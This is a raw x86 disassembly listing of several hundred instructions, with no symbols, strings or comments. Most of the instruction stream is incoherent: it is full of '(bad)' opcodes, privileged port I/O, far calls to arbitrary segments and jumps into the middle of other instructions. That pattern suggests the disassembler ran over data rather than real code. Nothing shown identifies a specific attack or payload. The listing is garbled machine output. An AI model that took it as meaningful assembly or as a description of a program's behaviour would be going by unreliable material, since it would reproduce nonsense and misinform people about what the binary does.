  421b40:	(bad)  
  421b41:	sbb    ecx,DWORD PTR [ebx-0x3e7e606e]
  421b47:	nop
  421b48:	ja     0x421b97
  421b4a:	or     eax,0xcd8b6efa
  421b4f:	adc    al,0x36
  421b51:	jb     0x421b86
  421b53:	in     al,dx
  421b54:	adc    ah,cl
  421b56:	xchg   ebp,eax
  421b57:	js     0x421bd2
  421b59:	xor    BYTE PTR [edx],cl
  421b5b:	maskmovq mm2,(bad)
  421b5c:	not    DWORD PTR [ecx+ecx*1+0x6e]
  421b60:	cmp    eax,0x77feaa8e
  421b65:	push   0xcf0dee3d
  421b6a:	pop    ss
  421b6b:	je     0x421afe
  421b6d:	push   ds
  421b6e:	jecxz  0x421bd0
  421b70:	mov    edx,ecx
  421b72:	test   BYTE PTR [ecx],dh
  421b74:	loop   0x421afe
  421b76:	sbb    edi,DWORD PTR [esi-0xc672fcb]
  421b7c:	mov    ds:0xf3960090,eax
  421b81:	dec    edx
  421b82:	cmp    dl,BYTE PTR [eax+0x4b]
  421b85:	mov    ?,WORD PTR [eax-0x7d]
  421b88:	ins    DWORD PTR es:[edi],dx
  421b89:	sbb    DWORD PTR [eax+edi*2+0x52],edi
  421b8d:	bound  edi,QWORD PTR [esi]
  421b8f:	in     eax,dx
  421b90:	(bad)  
  421b91:	mov    edx,0x397e8bb9
  421b96:	in     al,0xd5
  421b98:	add    DWORD PTR [esi+ebp*4],0x1ae55241
  421b9f:	push   0x24
  421ba1:	imul   eax,DWORD PTR [esi+0x8],0xd0cb551d
  421ba8:	add    ebx,DWORD PTR [esi+eiz*1-0x608930f]
  421baf:	mov    cs,WORD PTR [esi]
  421bb1:	push   esp
  421bb2:	stc    
  421bb3:	or     bl,BYTE PTR [edx]
  421bb5:	idiv   BYTE PTR [edi-0x45]
  421bb8:	inc    ebp
  421bb9:	inc    ebx
  421bba:	jbe    0x421b8d
  421bbc:	push   eax
  421bbd:	mov    ds:0xc695eae2,al
  421bc2:	jnp    0x421ba4
  421bc4:	bound  esp,QWORD PTR ds:[ebx]
  421bc7:	cs mov ecx,0x3368c2b8
  421bcd:	mov    cl,0x64
  421bcf:	fistp  DWORD PTR [ebp-0x2a7f14fc]
  421bd5:	pop    edx
  421bd6:	mov    WORD PTR [esi+0x47],es
  421bd9:	call   0x1317:0xfd50c29f
  421be0:	xor    ah,BYTE PTR ds:0x88427017
  421be6:	ror    BYTE PTR [ecx],cl
  421be8:	fdivrp st(1),st
  421bea:	fisttp WORD PTR [eax-0x211f292b]
  421bf0:	mov    ss,WORD PTR [ebx+eiz*2]
  421bf3:	dec    ecx
  421bf4:	stos   BYTE PTR es:[edi],al
  421bf5:	popf   
  421bf6:	fidiv  WORD PTR [esi+0x28ba3048]
  421bfc:	cmp    DWORD PTR [edx+eax*2+0x7e3cd47e],0x4e95ecba
  421c07:	nop
  421c08:	jecxz  0x421c1e
  421c0a:	pop    ecx
  421c0b:	jo     0x421bc0
  421c0d:	cli    
  421c0e:	pop    ecx
  421c0f:	test   DWORD PTR [eax-0x44],edx
  421c12:	and    DWORD PTR [ecx+0x21],edi
  421c15:	add    dh,BYTE PTR [ebx+0x57]
  421c18:	pop    ecx
  421c19:	dec    edx
  421c1a:	ret    0x4460
  421c1d:	(bad)  [edi-0x37]
  421c20:	mov    ebx,0xb095b1b4
  421c25:	das    
  421c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c28:	add    BYTE PTR [esi-0x3752668b],0x8
  421c2f:	mov    eax,ds:0x94e07da1
  421c34:	mov    al,ds:0xd63b6d95
  421c39:	sub    DWORD PTR [edx-0x365b4fda],0xecdee38
  421c43:	fwait
  421c44:	fwait
  421c45:	mov    cs,WORD PTR [edx+0x53]
  421c48:	mov    al,0x23
  421c4a:	xchg   ebp,eax
  421c4b:	cmp    eax,0xe5303eeb
  421c50:	fadd   DWORD PTR [esp+edi*2-0x74]
  421c54:	jl     0x421c35
  421c56:	test   BYTE PTR [ecx-0x2c],ch
  421c59:	adc    BYTE PTR [ebx],bl
  421c5b:	pop    ss
  421c5c:	add    al,0xa7
  421c5e:	sub    BYTE PTR [esp+edx*2-0x19],bl
  421c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c63:	adc    al,0xa8
  421c65:	fimul  WORD PTR [eax]
  421c67:	and    BYTE PTR [ebx-0x58],dh
  421c6a:	pop    ebp
  421c6b:	shl    cl,0x3
  421c6e:	int3   
  421c6f:	dec    edi
  421c70:	imul   DWORD PTR [ebx+0x53a43c4]
  421c76:	sbb    eax,0x90154849
  421c7b:	stc    
  421c7c:	jmp    0x421ca8
  421c7e:	aad    0xeb
  421c80:	shr    al,0x36
  421c83:	jmp    0x421c55
  421c85:	ins    DWORD PTR es:[edi],dx
  421c86:	lds    ebx,FWORD PTR [esi+0x5a]
  421c89:	std    
  421c8a:	(bad)  
  421c8b:	cli    
  421c8c:	xchg   edx,esp
  421c8e:	imul   edx,DWORD PTR ds:0xff873e3,0x3bfd4c70
  421c98:	shl    BYTE PTR [ebp+0x36],0x89
  421c9c:	shr    esp,cl
  421c9e:	repz fadd QWORD PTR [edx-0x4b]
  421ca2:	in     eax,0xbd
  421ca4:	mov    ?,WORD PTR [edi+0x4ba5d11e]
  421caa:	mov    ds:0x31d20809,eax
  421caf:	aaa    
  421cb0:	xlat   BYTE PTR ds:[ebx]
  421cb1:	adc    dh,BYTE PTR [esi-0x680c70d8]
  421cb7:	jecxz  0x421ca3
  421cb9:	push   esp
  421cba:	cs adc esp,ecx
  421cbd:	or     cl,BYTE PTR ds:0xc81bb471
  421cc3:	jb     0x421ca8
  421cc5:	aaa    
  421cc6:	or     BYTE PTR [edx],bh
  421cc8:	rcl    DWORD PTR [edx],cl
  421cca:	pop    edi
  421ccb:	push   esp
  421ccc:	ret    0xf92e
  421ccf:	jmp    0x1f429ef6
  421cd4:	imul   edx,DWORD PTR [ebp+ebp*1-0x6b7649ee],0xa0b085b9
  421cdf:	das    
  421ce0:	out    dx,al
  421ce1:	mov    ch,0x4f
  421ce3:	(bad)  
  421ce4:	sar    DWORD PTR [esi-0x39],cl
  421ce7:	(bad)  
  421ce8:	xor    cl,BYTE PTR [ecx]
  421cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ceb:	push   ebp
  421cec:	daa    
  421ced:	idiv   DWORD PTR [eax]
  421cef:	ffree  st(0)
  421cf1:	clc    
  421cf2:	aaa    
  421cf3:	inc    esp
  421cf4:	and    eax,0xe29717d9
  421cf9:	out    dx,eax
  421cfa:	mov    ebx,0xfbf5832f
  421cff:	(bad)  
  421d00:	call   0xe66c:0x2370000f
  421d07:	dec    edx
  421d08:	push   ebp
  421d09:	mov    cl,0x8a
  421d0b:	scas   eax,DWORD PTR es:[edi]
  421d0c:	mov    esi,esi
  421d0e:	ror    DWORD PTR [ebx+0x67],cl
  421d11:	inc    edx
  421d12:	xor    al,0xb6
  421d14:	iret   
  421d15:	call   0xeb2:0xbbcb26aa
  421d1c:	add    eax,0xfc51f602
  421d21:	aaa    
  421d22:	push   es
  421d23:	add    al,0x85
  421d25:	xchg   esi,eax
  421d26:	popa   
  421d27:	test   DWORD PTR [edi-0x268e90a5],0x52f4518d
  421d31:	(bad)  
  421d33:	sti    
  421d34:	mov    ecx,0x24a3082a
  421d39:	clc    
  421d3a:	sbb    ebx,DWORD PTR [ecx-0x7f5529cd]
  421d40:	(bad)  
  421d41:	(bad)
  421d44:	cld    
  421d45:	int    0x6e
  421d47:	cmc    
  421d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d49:	push   ebx
  421d4a:	or     ch,BYTE PTR [edx]
  421d4c:	icebp  
  421d4d:	mov    bh,0x59
  421d4f:	pushf  
  421d50:	push   ebp
  421d51:	mov    dl,BYTE PTR [ebx]
  421d53:	cdq    
  421d54:	inc    esi
  421d55:	call   DWORD PTR [eax-0x75]
  421d58:	adc    eax,ebx
  421d5a:	mov    ecx,0x246a3ce4
  421d5f:	outs   dx,BYTE PTR ds:[esi]
  421d60:	mov    eax,ds:0x5a2924a7
  421d65:	std    
  421d66:	or     al,0x6f
  421d68:	je     0x421d58
  421d6a:	jns    0x421dd0
  421d6c:	sbb    eax,0x60349140
  421d71:	and    BYTE PTR [esi-0x224d15a1],ah
  421d77:	sti    
  421d78:	mov    ds:0x19cfb5c5,al
  421d7d:	mov    al,0x3e
  421d7f:	int3   
  421d80:	push   0x7f868704
  421d85:	mov    ds:0x73dbbf50,eax
  421d8a:	inc    ebx
  421d8b:	(bad)  
  421d8c:	xchg   esi,eax
  421d8d:	mov    eax,ebp
  421d8f:	aas    
  421d90:	jg     0x421db5
  421d92:	ret    0x5b04
  421d95:	fadd   DWORD PTR [ebp-0x4aa22973]
  421d9b:	add    BYTE PTR [eax],0x12
  421d9e:	mov    bl,0x21
  421da0:	scas   eax,DWORD PTR es:[edi]
  421da1:	ret    
  421da2:	inc    ecx
  421da3:	xchg   ecx,eax
  421da4:	hlt    
  421da5:	pop    ebp
  421da6:	xor    ebp,DWORD PTR ds:0x1d7fce5d
  421dac:	ret    
  421dad:	out    0x73,eax
  421daf:	xchg   ebx,eax
  421db0:	(bad)  
  421db1:	dec    edx
  421db2:	push   eax
  421db3:	std    
  421db4:	mov    ebx,0x143c9a7e
  421db9:	scas   al,BYTE PTR es:[edi]
  421dba:	dec    esp
  421dbb:	sbb    eax,0x583fbc01
  421dc0:	mov    ds:0x984a6c1b,al
  421dc5:	mov    eax,0x72cdec75
  421dca:	mov    esp,0x5a579ca9
  421dcf:	adc    ch,BYTE PTR [ebx-0x22]
  421dd2:	jmp    0x5336:0xce3962a4
  421dd9:	jmp    0xe75a:0x3aef13f7
  421de0:	mov    ecx,0x4ef50cfa
  421de5:	in     eax,0xb3
  421de7:	xor    DWORD PTR [ebx-0x27],ecx
  421dea:	adc    BYTE PTR ds:0xc7944729,bh
  421df0:	shr    esi,1
  421df2:	(bad)  
  421df3:	loop   0x421e28
  421df5:	sar    BYTE PTR [edx+eax*8],0x70
  421df9:	xchg   DWORD PTR [edi+edx*2+0x0],eax
  421dfd:	cvtpi2ps xmm6,QWORD PTR ss:[ebx-0x4d]
  421e02:	jnp    0x421e4f
  421e04:	dec    ebp
  421e05:	mov    edx,0x4795f60b
  421e0a:	cmp    eax,0x3acbf0c3
  421e0f:	or     al,0x91
  421e11:	pusha  
  421e12:	(bad)  
  421e13:	out    0x56,al
  421e15:	mov    ah,0x0
  421e17:	adc    eax,0x97630ba9
  421e1c:	lods   al,BYTE PTR ds:[esi]
  421e1d:	js     0x421e5d
  421e1f:	scas   eax,DWORD PTR es:[edi]
  421e20:	imul   ecx,esi,0x353cae37
  421e26:	es jl  0x421e00
  421e29:	(bad)  
  421e2a:	ror    ebp,cl
  421e2c:	out    dx,al
  421e2d:	adc    DWORD PTR [edi+0x291ad98a],ecx
  421e33:	xchg   esi,eax
  421e34:	dec    ebx
  421e35:	cdq    
  421e36:	inc    esi
  421e37:	mov    ebp,0x3de8307b
  421e3c:	xchg   cl,bh
  421e3e:	inc    ebp
  421e3f:	aam    0xc5
  421e41:	or     eax,0x6f11c10e
  421e46:	sub    al,0x6e
  421e48:	xor    DWORD PTR [ebx+0x3a],esi
  421e4b:	and    al,0x4
  421e4d:	inc    ecx
  421e4e:	fucom  st(4)
  421e50:	dec    edi
  421e51:	jo     0x421e79
  421e53:	pop    edx
  421e54:	(bad)
  421e57:	loope  0x421def
  421e59:	push   ebx
  421e5a:	mov    eax,0x29b171b6
  421e5f:	dec    ecx
  421e60:	(bad)  
  421e61:	fnstsw WORD PTR [ecx+edx*4-0x5789da71]
  421e68:	and    DWORD PTR [esi-0x4d39a977],ecx
  421e6e:	adc    al,0x53
  421e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e71:	out    dx,al
  421e72:	iret   
  421e73:	(bad)  
  421e74:	pop    ss
  421e75:	fstp   DWORD PTR [edx-0x5c08fa66]
  421e7b:	stos   DWORD PTR es:[edi],eax
  421e7c:	adc    bl,bh
  421e7e:	cmp    ecx,esp
  421e80:	fistp  DWORD PTR [edx]
  421e82:	adc    DWORD PTR [edx],ebp
  421e84:	pop    edx
  421e85:	lock mov eax,0x1cb185a5
  421e8b:	mov    edi,0xea6a741a
  421e90:	mul    DWORD PTR [eax]
  421e92:	daa    
  421e93:	jo     0x421e5c
  421e95:	daa    
  421e96:	enter  0x172a,0x24
  421e9a:	das    
  421e9b:	inc    esp
  421e9c:	out    dx,al
  421e9d:	in     eax,0xf1
  421e9f:	(bad)  
  421ea0:	stos   DWORD PTR es:[edi],eax
  421ea1:	mov    WORD PTR [edx-0x17],gs
  421ea4:	fidivr WORD PTR [edi+ebp*8+0x497a7ef9]
  421eab:	bound  ebp,QWORD PTR [esi-0x5c]
  421eae:	cmp    BYTE PTR [eax-0x3e],bh
  421eb1:	ds mov al,0xbb
  421eb4:	(bad)  
  421eb5:	adc    eax,0xd547bb22
  421eba:	mov    bl,BYTE PTR [ebx-0x2aa947d7]
  421ec0:	retf   
  421ec1:	sti    
  421ec2:	call   0xc33a:0xaf0350a
  421ec9:	in     eax,0x35
  421ecb:	jno    0x421f07
  421ecd:	mov    ah,0x36
  421ecf:	(bad)  
  421ed0:	out    dx,eax
  421ed1:	(bad)  cs:[edx+0x5f]
  421ed5:	and    al,0x43
  421ed7:	jle    0x421eb3
  421ed9:	mov    WORD PTR [eax-0x7f],cs
  421edc:	hlt    
  421edd:	es push edi
  421edf:	jne    0x421e82
  421ee1:	jle    0x421f55
  421ee3:	adc    esi,DWORD PTR ds:0x1b632d16
  421ee9:	push   0x6b11c271
  421eee:	fisubr WORD PTR [ebx+0x5c401d10]
  421ef4:	add    BYTE PTR [esi+edi*8],ah
  421ef7:	mov    dl,BYTE PTR [ebx]
  421ef9:	shr    DWORD PTR [ecx+0x23],1
  421efc:	adc    BYTE PTR [ebp+ecx*2+0x5e],al
  421f00:	je     0x421e9e
  421f02:	leave  
  421f03:	pop    eax
  421f04:	dec    esp
  421f05:	fst    DWORD PTR [esi-0xf]
  421f08:	push   0x2f7e00e4
  421f0d:	add    edx,edi
  421f0f:	add    dh,BYTE PTR [edx-0x4782985b]
  421f15:	inc    ebx
  421f16:	jb     0x421eee
  421f18:	sbb    eax,0x591cd0d1
  421f1d:	or     al,0x8e
  421f1f:	push   es
  421f20:	jns    0x421f61
  421f22:	sbb    eax,0x72fc4661
  421f27:	inc    eax
  421f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f29:	jbe    0x421f41
  421f2b:	loopne 0x421ed5
  421f2d:	or     dh,BYTE PTR [eax-0x3d]
  421f30:	mov    ds:0x81ae6c17,eax
  421f35:	or     BYTE PTR [ecx],ch
  421f37:	fst    QWORD PTR gs:[esp+ebx*1]
  421f3b:	ds test al,0xdf
  421f3e:	xchg   ebx,eax
  421f3f:	out    0xe8,eax
  421f41:	arpl   bp,sp
  421f43:	ds test esp,ebp
  421f46:	mov    ecx,0xe1fc2c22
  421f4b:	mov    edx,DWORD PTR [esi]
  421f4d:	dec    edi
  421f4e:	sub    bl,bl
  421f50:	mov    ebx,0x6463d5ea
  421f55:	imul   esi,DWORD PTR [ecx+0x48c9bfb],0xffffff86
  421f5c:	fnstsw WORD PTR [eax]
  421f5e:	sub    BYTE PTR gs:[ebp-0x7],al
  421f62:	or     BYTE PTR [ecx+0x5c],dl
  421f65:	adc    BYTE PTR [esi+edi*1+0x194b4cb8],ch
  421f6c:	cli    
  421f6d:	adc    ecx,DWORD PTR [ebx+0xc461d87]
  421f73:	out    0xbe,eax
  421f75:	(bad)  
  421f76:	and    al,0x98
  421f78:	dec    eax
  421f79:	iret   
  421f7a:	pop    ds
  421f7b:	(bad)  
  421f7c:	int3   
  421f7d:	gs xor al,0xd3
  421f80:	pop    edx
  421f81:	ret    0x1541
  421f84:	iret   
  421f85:	jecxz  0x421f07
  421f87:	add    bl,BYTE PTR [ecx+0x5b]
  421f8a:	fwait
  421f8b:	imul   ecx,eax,0xe30f18
  421f91:	xchg   edx,eax
  421f92:	ret    
  421f93:	dec    esp
  421f94:	cmp    eax,0x8960ebf9
  421f99:	add    BYTE PTR [ebp-0x7],0xf9
  421f9d:	nop
  421f9e:	mov    dh,cl
  421fa0:	xchg   DWORD PTR [edx+0x77634761],esp
  421fa6:	add    bl,bl
  421fa8:	or     al,0xb7
  421faa:	sub    cl,BYTE PTR [eax]
  421fac:	(bad)  
  421fad:	push   0x86b1289c
  421fb2:	fnstcw WORD PTR [eax-0x40b2488a]
  421fb8:	icebp  
  421fb9:	test   dl,al
  421fbb:	mov    eax,ds:0x4580e7b0
  421fc0:	mul    BYTE PTR [esp+edx*8+0x54049f4b]
  421fc7:	pushf  
  421fc8:	mov    esi,0x78b6812c
  421fcd:	add    ch,BYTE PTR [ebp+0xfbd7643]
  421fd3:	mov    al,0x7d
  421fd5:	stos   BYTE PTR es:[edi],al
  421fd6:	or     BYTE PTR [ecx-0x28],0xba
  421fda:	xor    DWORD PTR ds:0xc0457e2,0x5f
  421fe1:	sub    bh,ch
  421fe3:	das    
  421fe4:	sbb    eax,0x5dfcae5
  421fe9:	loop   0x421f74
  421feb:	pop    edi
  421fec:	shl    DWORD PTR [esi+0x7f7f70e9],1
  421ff2:	in     eax,dx
  421ff3:	dec    eax
  421ff4:	ds inc ebp
  421ff6:	test   DWORD PTR [ebp+0x39],edi
  421ff9:	push   esi
  421ffa:	and    DWORD PTR [ebx-0x525f882],0x1e
  422001:	jnp    0x421fae
  422003:	dec    esp
  422004:	jge    0x421fed
  422006:	mov    ecx,0x3e60699e
  42200b:	xchg   edx,eax
  42200c:	jl     0x421ff5
  42200e:	iret   
  42200f:	fsubr  QWORD PTR [eax]
  422011:	jle    0x421fe4
  422013:	int    0xee
  422015:	or     DWORD PTR [eax+0x16],esp
  422018:	sub    BYTE PTR [ecx-0x4a10e7f1],bh
  42201e:	fcom   DWORD PTR [eax-0x1ad2756d]
  422024:	rol    DWORD PTR [eax+0x1a],1
  422027:	sbb    BYTE PTR [ebx-0x4ad1e2a7],0x31
  42202e:	sub    al,0x7a
  422030:	xor    edx,ebx
  422032:	or     al,0xd
  422034:	fldenv [esi-0x4a]
  422037:	sti    
  422038:	and    al,0xfc
  42203a:	dec    ebp
  42203b:	mov    ecx,0xc0bfcec9
  422040:	jne    0x42208f
  422042:	mov    esi,0xe66b2621
  422047:	cmp    eax,0xcd010a49
  42204c:	mov    cs:0x92ebfe60,eax
  422052:	and    al,0xd5
  422054:	test   BYTE PTR [edi+0x38],bh
  422057:	pop    ebx
  422058:	adc    BYTE PTR [esi-0x30aaa6c6],dl
  42205e:	pminsw mm2,QWORD PTR [esi+0x3c]
  422062:	call   0x56ec:0xe6def9b7
  422069:	inc    edx
  42206a:	add    BYTE PTR [ebx],bh
  42206c:	ja     0x421ff9
  42206e:	dec    edx
  42206f:	in     al,dx
  422070:	xchg   edi,eax
  422071:	add    bh,BYTE PTR [esi-0x26]
  422074:	hlt    
  422075:	cs icebp 
  422077:	and    ebp,DWORD PTR [ebx+eiz*2-0x6f]
  42207b:	sbb    eax,DWORD PTR ds:0xb07b4cbd
  422081:	(bad)  
  422082:	pop    ds
  422083:	and    ah,BYTE PTR [ebx+0x5a]
  422086:	fcmovnu st,st(0)
  422088:	in     al,0x60
  42208a:	mov    ecx,0xb92fb3fa
  42208f:	xchg   ecx,eax
  422090:	fld    st(3)
  422092:	or     bl,ah
  422094:	js     0x42208a
  422096:	xchg   BYTE PTR [edx+ebp*4],dh
  422099:	test   DWORD PTR [ebx],eax
  42209b:	jl     0x4220de
  42209d:	cmp    edx,ebp
  42209f:	cmove  esi,DWORD PTR [eax+0x2b49e5ba]
  4220a6:	sub    esp,DWORD PTR [edx]
  4220a8:	dec    ebx
  4220a9:	pop    eax
  4220aa:	add    ch,cl
  4220ac:	fst    DWORD PTR [eax+0x19]
  4220af:	cmp    edx,edi
  4220b1:	cld    
  4220b2:	test   ebx,edx
  4220b4:	xor    DWORD PTR [eax-0x4c],esi
  4220b7:	sti    
  4220b8:	push   ebp
  4220b9:	dec    eax
  4220ba:	push   0xffffffce
  4220bc:	cwde   
  4220bd:	les    eax,FWORD PTR [esi]
  4220bf:	cmp    bh,bl
  4220c1:	test   edi,ecx
  4220c3:	or     esi,edi
  4220c5:	sti    
  4220c6:	in     al,dx
  4220c7:	fcmovbe st,st(7)
  4220c9:	(bad)  
  4220ca:	ror    DWORD PTR [esi],1
  4220cc:	out    0xc1,al
  4220ce:	stos   BYTE PTR es:[edi],al
  4220cf:	(bad)  
  4220d0:	repz (bad) 
  4220d2:	and    ecx,eax
  4220d4:	out    dx,eax
  4220d5:	and    eax,0x16ac84e6
  4220da:	mov    bh,0x4c
  4220dc:	ror    BYTE PTR [esi-0x6911729b],0x94
  4220e3:	js     0x4220c6
  4220e5:	dec    eax
  4220e6:	retf   0xd199
  4220e9:	hlt    
  4220ea:	cmp    al,0x9d
  4220ec:	dec    esp
  4220ed:	cmp    eax,DWORD PTR [edx+0x3c]
  4220f0:	inc    esp
  4220f1:	mov    WORD PTR [eax],ss
  4220f3:	mov    dl,0x97
  4220f5:	out    0xd1,al
  4220f7:	inc    ebp
  4220f8:	push   cs
  4220f9:	adc    al,0x84
  4220fb:	out    0xab,eax
  4220fd:	enter  0xbe5f,0x8d
  422101:	data16 mov bl,0xa2
  422104:	lea    ebx,[edx]
  422106:	shl    DWORD PTR [ecx-0xf492eee],cl
  42210c:	lock adc eax,0xa6c19ac1
  422112:	sub    al,BYTE PTR [edx]
  422114:	jmp    0x3619:0x8da0a43b
  42211b:	mov    bh,0xf4
  42211d:	addr16 pop edx
  42211f:	les    ebp,FWORD PTR [ebx+0x5e21aa7a]
  422125:	mov    dl,0x83
  422127:	jmp    0x1736:0x7222fa2e
  42212e:	jmp    0x4220f9
  422130:	jo     0x42215f
  422132:	dec    edi
  422133:	pop    edi
  422134:	(bad)  
  422135:	xchg   ebp,eax
  422136:	pop    eax
  422137:	cmp    dh,cl
  422139:	(bad)  [edi-0x32b8c7a7]
  42213f:	adc    eax,0x67d5b756
  422144:	mov    ecx,0x7af520a3
  422149:	push   edx
  42214a:	pushf  
  42214b:	pop    ds
  42214c:	or     eax,0xcef68921
  422151:	stos   BYTE PTR es:[edi],al
  422152:	into   
  422153:	add    al,0xbd
  422155:	shr    BYTE PTR [ecx-0x7d],cl
  422158:	sbb    eax,0x40e440da
  42215d:	mov    ebx,fs
  42215f:	lahf   
  422160:	(bad)  [esi-0x36]
  422163:	fdivr  st(1),st
  422165:	push   cs
  422166:	fnsave [esi]
  422168:	mov    edx,0x5b20bd5
  42216d:	not    BYTE PTR [edi+0x64]
  422170:	dec    ebx
  422171:	dec    esi
  422172:	popf   
  422173:	jno    0x4220fd
  422175:	inc    edx
  422176:	int3   
  422177:	push   cs
  422178:	pushf  
  422179:	xchg   edx,eax
  42217a:	push   es
  42217b:	xor    al,0xe5
  42217d:	in     eax,0x1e
  42217f:	nop
  422180:	add    eax,eax
  422182:	add    BYTE PTR [esi],dl
  422184:	xchg   DWORD PTR ss:[edx+0x37],edx
  422188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422189:	jno    0x4221f1
  42218b:	mov    fs,WORD PTR [esi+0x539eb93]
  422191:	jb     0x42213c
  422193:	and    eax,0xe78f1d39
  422198:	shr    DWORD PTR [eax-0x1f],cl
  42219b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42219c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42219d:	xchg   edx,eax
  42219e:	sub    DWORD PTR [eax],ecx
  4221a0:	jmp    0xfa9efddd
  4221a5:	xchg   esi,eax
  4221a6:	ins    BYTE PTR es:[edi],dx
  4221a7:	inc    eax
  4221a8:	add    esi,eax
  4221aa:	jae    0x4221f7
  4221ac:	and    BYTE PTR [edx+0x1538322a],bh
  4221b2:	and    al,0x83
  4221b4:	mov    ecx,0xf74eeee6
  4221b9:	into   
  4221ba:	fidiv  DWORD PTR [edi]
  4221bc:	cmp    al,0x1a
  4221be:	ficom  WORD PTR [edi]
  4221c0:	push   esp
  4221c1:	daa    
  4221c2:	mov    esi,edx
  4221c4:	dec    ebx
  4221c5:	test   eax,0xbefc718b
  4221ca:	xor    dl,0xe7
  4221cd:	pop    edi
  4221ce:	cmpxchg BYTE PTR ds:0xb972e5e4,ch
  4221d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d6:	inc    ebp
  4221d7:	dec    ecx
  4221d8:	(bad)  
  4221d9:	adc    ebx,edi
  4221db:	gs inc eax
  4221dd:	push   edx
  4221de:	xchg   esp,eax
  4221df:	mov    dl,0xe4
  4221e1:	call   0xfe5e3980
  4221e6:	fld    TBYTE PTR [esi+0x3d]
  4221e9:	test   DWORD PTR [esp+ebp*8],ebx
  4221ec:	call   0x1563c080
  4221f1:	aad    0xb2
  4221f3:	ins    DWORD PTR es:[edi],dx
  4221f4:	scas   al,BYTE PTR es:[edi]
  4221f5:	sbb    BYTE PTR [edi],al
  4221f7:	mov    ebx,0x64908054
  4221fc:	sub    eax,0xe3509fd4
  422201:	add    ecx,DWORD PTR [esi-0x3f]
  422204:	jbe    0x4221ab
  422206:	adc    DWORD PTR [ecx],0xe67beca9
  42220c:	fdivrp st(0),st
  42220e:	jo     0x42226a
  422210:	sbb    edx,eax
  422212:	pop    ebp
  422213:	inc    ebp
  422214:	test   DWORD PTR [eax+0x1720b575],edx
  42221a:	stos   DWORD PTR es:[edi],eax
  42221b:	arpl   si,bx
  42221d:	jmp    DWORD PTR [ebx+ebp*1+0x64e10da9]
  422224:	rcr    DWORD PTR [ebx],1
  422226:	fdiv   QWORD PTR [eax-0x2f288a4e]
  42222c:	push   edx
  42222d:	mov    ecx,0xb57207c6
  422232:	mov    ds:0xaa4ac23b,eax
  422237:	(bad)  
  422238:	mov    ds:0x4c6b235,eax
  42223d:	pop    edx
  42223e:	pop    esi
  42223f:	stos   DWORD PTR es:[edi],eax
  422240:	dec    ecx
  422241:	imul   eax,DWORD PTR [ecx],0x7e1fcf8a
  422247:	jno    0x42226c
  422249:	call   0x683e3fed
  42224e:	mov    al,0x75
  422250:	push   ss
  422251:	mov    cs,WORD PTR [edx-0x45]
  422254:	mov    esp,0xad68a4e9
  422259:	push   edx
  42225a:	mov    BYTE PTR [ebx],0xef
  42225d:	fldcw  WORD PTR [ebx]
  42225f:	push   0xfffffff3
  422261:	das    
  422262:	shr    dl,0x17
  422265:	mov    DWORD PTR [eax+0x5c634907],edx
  42226b:	pop    ecx
  42226c:	mov    edx,0x36f44b16
  422271:	sub    dh,BYTE PTR [esi-0x62c71306]
  422277:	loope  0x422299
  422279:	mov    edi,DWORD PTR gs:0xe4b57ffe
  422280:	sub    eax,0x803c6b1f
  422285:	test   eax,0xa5723394
  42228a:	add    DWORD PTR [eax+ebp*4-0x3d],ebp
  42228e:	(bad)  
  42228f:	lods   al,BYTE PTR ds:[esi]
  422290:	fs sub al,0x3
  422293:	adc    DWORD PTR [eax-0x4c36b51f],0x1d1ad2b1
  42229d:	dec    edx
  42229e:	pop    esi
  42229f:	sti    
  4222a0:	addr16 dec edi
  4222a2:	cmp    dh,BYTE PTR [ebp-0x54]
  4222a5:	mov    bl,BYTE PTR [ebp-0x5e6f9655]
  4222ab:	loope  0x422233
  4222ad:	(bad)  
  4222ae:	fdiv   DWORD PTR [edi+0x738f657d]
  4222b4:	push   cs
  4222b5:	in     al,dx
  4222b6:	cmp    dl,BYTE PTR [edx+edx*8]
  4222b9:	sub    al,0xc5
  4222bb:	nop
  4222bc:	scas   eax,DWORD PTR es:[edi]
  4222bd:	inc    eax
  4222be:	cmc    
  4222bf:	adc    eax,0xde156ded
  4222c4:	push   0xfffffff4
  4222c6:	sbb    al,0x6e
  4222c8:	ja     0x422341
  4222ca:	iret   
  4222cb:	lock or al,0x95
  4222ce:	sub    eax,0x732fa688
  4222d3:	cmp    esp,DWORD PTR [eax-0x63402c8c]
  4222d9:	lahf   
  4222da:	push   cs
  4222db:	mov    ds:0x7d2c9cf9,al
  4222e0:	xchg   ecx,eax
  4222e1:	fstp   TBYTE PTR [ecx]
  4222e3:	xor    al,0x4
  4222e5:	dec    ecx
  4222e6:	lods   eax,DWORD PTR ds:[esi]
  4222e7:	dec    ebx
  4222e8:	jbe    0x4222ef
  4222ea:	push   ecx
  4222eb:	(bad)  
  4222ed:	nop
  4222ee:	push   esp
  4222ef:	mul    DWORD PTR [esi-0x7b2960e6]
  4222f5:	or     al,dh
  4222f7:	je     0x422325
  4222f9:	lahf   
  4222fa:	xchg   BYTE PTR [eax-0x22],ch
  4222fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ff:	std    
  422300:	loope  0x4222e2
  422302:	lahf   
  422303:	pop    ss
  422304:	mov    edx,0x3c6a1ea2
  422309:	xor    ebx,DWORD PTR ds:0xd84e66ef
  42230f:	call   0xd534:0x94353890
  422316:	imul   DWORD PTR [ebp-0x316b313]
  42231c:	xor    al,0x93
  42231e:	mov    bh,0xdc
  422320:	push   ss
  422321:	and    bl,bh
  422323:	js     0x4222ee
  422325:	enter  0xbcdc,0x20
  422329:	mov    cl,0x6c
  42232b:	hlt    
  42232c:	outs   dx,DWORD PTR ds:[esi]
  42232d:	stc    
  42232e:	add    BYTE PTR [ecx+0x75928ddf],bl
  422334:	pop    ds
  422335:	cli    
  422336:	cmp    dh,BYTE PTR [eax]
  422338:	test   BYTE PTR [edi+0x69b1da00],0x88
  42233f:	(bad)  
